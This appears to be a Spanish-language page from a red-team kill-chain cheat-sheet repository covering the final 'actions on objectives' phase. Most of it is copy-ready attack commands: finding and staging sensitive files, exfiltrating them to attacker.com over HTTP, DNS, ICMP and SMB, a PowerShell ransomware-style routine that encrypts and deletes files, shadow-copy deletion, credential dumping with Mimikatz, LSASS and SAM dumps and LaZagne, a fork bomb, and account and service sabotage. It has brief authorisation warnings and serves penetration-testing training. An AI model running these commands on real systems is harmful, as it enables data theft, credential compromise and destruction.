# 🎯 Fase 7: Acciones sobre los objetivos

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](07-Actions-Objectives.tr.md) • [🇬🇷 Ελληνικά](07-Actions-Objectives.el.md)

```
   █████╗  ██████╗████████╗██╗ ██████╗ ███╗   ██╗███████╗     ██████╗ ███╗   ██╗
  ██╔══██╗██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝    ██╔═══██╗████╗  ██║
  ███████║██║        ██║   ██║██║   ██║██╔██╗ ██║███████╗    ██║   ██║██╔██╗ ██║
  ██╔══██║██║        ██║   ██║██║   ██║██║╚██╗██║╚════██║    ██║   ██║██║╚██╗██║
  ██║  ██║╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║███████║    ╚██████╔╝██║ ╚████║
  ╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝     ╚═════╝ ╚═╝  ╚═══╝
         ██████╗ ██████╗      ██╗███████╗ ██████╗████████╗██╗██╗   ██╗███████╗███████╗
        ██╔═══██╗██╔══██╗     ██║██╔════╝██╔════╝╚══██╔══╝██║██║   ██║██╔════╝██╔════╝
        ██║   ██║██████╔╝     ██║█████╗  ██║        ██║   ██║██║   ██║█████╗  ███████╗
        ██║   ██║██╔══██╗██   ██║██╔══╝  ██║        ██║   ██║╚██╗ ██╔╝██╔══╝  ╚════██║
        ╚██████╔╝██████╔╝╚█████╔╝███████╗╚██████╗   ██║   ██║ ╚████╔╝ ███████╗███████║
         ╚═════╝ ╚═════╝  ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═══╝  ╚══════╝╚══════╝
```

**Objetivo:** Alcanzar el objetivo final: exfiltración de datos, destrucción u otro impacto.

---

## 📤 Exfiltración de datos

### Localización de datos sensibles

#### Windows
```cmd
# Buscar archivos sensibles
dir /s /b *password* *credential* *secret* *.kdbx *.key
dir /s /b *.doc* *.xls* *.pdf *.txt *.config

# Buscar archivos modificados recientemente
forfiles /P C:\ /S /D +01/01/2024 /C "cmd /c echo @path"

# PowerShell - Buscar por contenido
Get-ChildItem -Recurse | Select-String -Pattern "password" -List | Select Path
Get-ChildItem -Path C:\ -Include *.txt,*.doc*,*.xls* -Recurse -ErrorAction SilentlyContinue
```

#### Linux
```bash
# Buscar archivos sensibles
find / -name "*password*" -o -name "*.key" -o -name "*.pem" 2>/dev/null
find / -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -l "password"

# Archivos recientes
find / -mtime -7 -type f 2>/dev/null

# Archivos grandes
find / -size +100M -type f 2>/dev/null
```

### Comprimir y preparar datos

#### Windows
```powershell
# PowerShell - Crear un ZIP
Compress-Archive -Path C:\Sensitive -DestinationPath C:\temp\data.zip

# 7-Zip
7z a -p"password" data.7z C:\Sensitive\*

# Tar con compresión
tar -cvzf data.tar.gz C:\Sensitive\
```

#### Linux
```bash
# Crear un archivo comprimido
tar -cvzf /tmp/data.tar.gz /home/user/sensitive/

# Con cifrado
tar -cvzf - /sensitive | openssl enc -aes-256-cbc -e > data.tar.gz.enc

# ZIP con contraseña
zip -r -e data.zip /sensitive/
```

### Métodos de exfiltración

#### HTTP/HTTPS
```bash
# Subir mediante curl
curl -X POST -F "file=@/tmp/data.zip" http://attacker.com/upload.php

# Base64 mediante GET (datos pequeños)
base64 /tmp/data.zip | curl -d @- http://attacker.com/receive

# Subida mediante PowerShell
$bytes = [IO.File]::ReadAllBytes("C:\temp\data.zip")
Invoke-WebRequest -Uri "http://attacker.com/upload" -Method POST -Body $bytes
```

#### Exfiltración mediante DNS
```bash
# Codificar datos en consultas DNS
cat /tmp/data | xxd -p | while read line; do nslookup $line.attacker.com; done

# Usar dnscat2
dnscat2 attacker.com

# DNSExfiltrator
python dnsexfiltrator.py -d attacker.com -f data.zip
```

#### ICMP
```bash
# Exfiltrar mediante ping
xxd -p -c 4 data.zip | while read line; do ping -c 1 -p $line attacker.com; done

# Usar icmpsh
python icmpsh_m.py ATTACKER_IP VICTIM_IP
```

#### SMB
```bash
# Copiar al recurso compartido del atacante
copy C:\Sensitive\data.zip \\attacker_ip\share\

# Montar y copiar (Linux)
smbclient //attacker_ip/share -U user -c "put data.zip"
```

#### Servicios en la nube
```bash
# AWS S3
aws s3 cp data.zip s3://bucket-name/

# Azure Blob
az storage blob upload --file data.zip --container-name mycontainer --name data.zip

# Google Cloud
gsutil cp data.zip gs://bucket-name/
```

---

## 💣 Acciones destructivas (simulación de ransomware)

> ⚠️ **ADVERTENCIA:** ¡Solo para ejercicios de red team autorizados!

### Simulación de cifrado
```powershell
# PowerShell - Cifrar archivos (simulación)
$key = [System.Text.Encoding]::UTF8.GetBytes("0123456789ABCDEF")
$files = Get-ChildItem -Path C:\TestData -Recurse -File
foreach ($file in $files) {
    $content = Get-Content $file.FullName -Raw
    $encrypted = [System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes($content), $key, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    Set-Content "$($file.FullName).encrypted" $encrypted
    Remove-Item $file.FullName
}
```

### Eliminación de instantáneas de volumen
```cmd
# Eliminar instantáneas (impide la recuperación)
vssadmin delete shadows /all /quiet
wmic shadowcopy delete

# Desactivar las instantáneas
vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB
```

---

## 🔐 Recopilación de credenciales

### Credenciales de Windows
```powershell
# Mimikatz - Todas las credenciales
mimikatz# sekurlsa::logonpasswords

# Volcar la base de datos SAM
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
mimikatz# lsadump::sam /sam:SAM /system:SYSTEM

# Volcado de LSASS
procdump -ma lsass.exe lsass.dmp
mimikatz# sekurlsa::minidump lsass.dmp

# Extraer del volcado
pypykatz lsa minidump lsass.dmp
```

### Credenciales de Linux
```bash
# Archivo shadow
cat /etc/shadow

# Claves SSH
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null

# Archivos de historial
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.psql_history

# Archivos de configuración
grep -r "password" /etc/ 2>/dev/null
grep -r "password" /home/ 2>/dev/null
```

### Credenciales del navegador
```bash
# Credenciales de Chrome (Windows)
# Ubicación: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data

# Credenciales de Firefox (Windows)
# Ubicación: %APPDATA%\Mozilla\Firefox\Profiles\*.default\logins.json

# LaZagne - Todas las contraseñas de navegadores
python laZagne.py all
```

---

## 🖥️ Impacto en el sistema

### Denegación de servicio
```bash
# Bomba fork (Linux): ¡NO EJECUTAR!
:(){ :|:& };:

# Llenar el disco
dd if=/dev/zero of=/tmp/fill bs=1M count=100000

# Agotamiento de CPU
yes > /dev/null &
```

### Manipulación de cuentas
```bash
# Cambiar las contraseñas de todos los usuarios
net user administrator NewP@ssw0rd!

# Bloquear cuentas
net user username /active:no

# Eliminar usuarios
net user username /delete
```

### Interrupción de servicios
```cmd
# Detener servicios críticos
net stop "DNS Server"
net stop "Active Directory Domain Services"

# Desactivar servicios
sc config wuauserv start= disabled
```

---

## 📊 Referencia rápida

### Métodos de exfiltración

| Método | Ventajas | Inconvenientes |
|--------|------|------|
| HTTP/HTTPS | Tráfico habitual, cifrado | Puede estar supervisado |
| DNS | A menudo sin supervisión | Lento, con límites de tamaño |
| ICMP | Puede eludir cortafuegos | Muy lento |
| SMB | Rápido, nativo | Solo interno |
| Nube | Servicios legítimos | Requiere credenciales |

### Prioridades según la ubicación de los datos

| Ubicación | Valor |
|----------|-------|
| Controlador de dominio | Máximo: credenciales de AD |
| Servidores de archivos | Alto: documentos |
| Servidores de correo | Alto: comunicaciones |
| Servidores de bases de datos | Alto: datos de negocio |
| Servidores de desarrollo | Medio: código fuente |
| Estaciones de trabajo de usuarios | Medio: archivos locales |

---

## ✅ Lista de comprobación del informe de pentest

```markdown
- [ ] Documentar todos los sistemas comprometidos
- [ ] Enumerar todas las credenciales descubiertas
- [ ] Representar la ruta de ataque desde el acceso inicial
- [ ] Documentar las vulnerabilidades explotadas
- [ ] Anotar las ubicaciones de datos sensibles encontradas
- [ ] Proporcionar recomendaciones de corrección
- [ ] Incluir una cronología de las actividades
- [ ] Capturar pruebas del acceso mediante imágenes
```

---

## 🔗 Guías de referencia relacionadas

- [Mimikatz](../../Mimikatz/translations/README.es.md)
- [Comandos de Linux](../../Linux-Commands/translations/README.es.md)
- [PowerShell](../../PowerShell/translations/README.es.md)

---

**Fase anterior:** [← 06 - Evasión de defensas](./06-Defense-Evasion.es.md)

**Volver al resumen:** [🎯 Resumen de la Kill Chain](./README.es.md)

---

<p align="center">
  <b>🎯 ¡Misión completada!</b><br>
  <i>Recuerda: ¡realiza estas acciones únicamente con la autorización adecuada!</i>
</p>
